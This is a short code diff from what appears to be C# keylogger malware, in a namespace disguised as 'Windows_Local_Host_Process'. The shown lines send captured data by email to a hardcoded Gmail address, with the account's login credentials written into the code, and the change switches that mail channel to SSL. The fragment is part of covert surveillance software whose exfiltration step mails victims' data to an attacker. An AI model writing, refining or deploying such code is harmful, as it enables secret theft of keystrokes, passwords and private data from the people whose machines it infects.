@@ -106,7 +106,7 @@ namespace Windows_Local_Host_Process
             mailMessage.To.Add("keyloggeremail458@gmail.com");
             mailMessage.Subject = subject;
             client.UseDefaultCredentials = false;
-            client.EnableSsl = false;
+            client.EnableSsl = true;
             client.Credentials = new System.Net.NetworkCredential("keyloggeremail458@gmail.com", "keyloggerpass*");
             mailMessage.Body = emailBody;
 
